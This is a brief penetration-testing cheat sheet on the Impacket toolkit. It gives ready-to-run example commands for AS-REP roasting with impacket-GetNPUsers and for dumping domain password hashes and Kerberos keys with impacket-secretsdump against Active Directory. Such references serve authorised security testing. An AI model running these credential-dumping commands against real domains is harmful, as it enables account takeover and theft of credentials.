---
title: Impacket
desc: Provides low level access to the packets. Also, impacket-GetNPUsers is used for ASREPRoasting.
tags: [ActiveDirectory, ActiveRecon, Windows]
alts: [Bloodhound, Kerbrute, Mimikatz]
website:
render_with_liquid: false
---

```sh
impacket-netview -h
```

<br />

## impacket-GetNPUsers

Lists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.

```sh
# Get password (e.g. domain: 'example.local', username: 'admin')
impacket-GetNPUsers -dc-ip 10.0.0.1 -format hashcat example.local/admin
```

<br />

## impacket-secretsdump

Gets all password hashes.

```sh
# Basic
impacket-secretsdump example.local/admin:admin@10.0.0.1

# Only NTLM hashes and Kerberos keys
impacket-secretsdump -just-dc example.local/admin:admin@10.0.0.1

# Only NTLM hashes
impacket-secretsdump -just-dc-ntlm example.local/admin:admin@10.0.0.1
```